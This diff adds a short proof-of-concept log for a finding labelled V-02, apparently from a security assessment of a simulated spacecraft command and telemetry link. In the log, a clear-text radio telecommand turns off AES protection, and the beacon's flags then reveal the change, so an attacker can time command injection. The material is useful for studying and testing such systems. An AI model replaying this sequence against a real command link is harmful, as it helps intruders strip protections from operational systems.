@@ -1,0 +1,18 @@
+[   0.000] ========================================================================
+[   0.000] V-02 chatty beacon exposes protection state
+[   0.000] ========================================================================
+[   0.000] --> TC apid=0x05 via=usb AES  payload=01
+[   0.000] --> advance(2500 ms)
+[   0.002] <-- TM apid=0x01 AES len=64
+[   0.003] <-- TM apid=0x01 AES len=64
+[   0.004] <-- TM apid=0x01 AES len=64
+[   0.004] beacon: mode=0x01 flags=0x1F flags2=0x00 bus=23.99V tilt=0.00 boot=0
+[   0.004] --> TC apid=0x0A via=radio clear payload=00
+[   0.005] <-- TM apid=0x0A clear len=3
+[   0.005] --> advance(1500 ms)
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] after AES-off beacon flags=0x0F (SEC bit cleared)
+[   0.005] attacker picks the injection window from the beacon alone
+[   0.005] ========================================================================
+[   0.005] POC OK
+[   0.005] ========================================================================
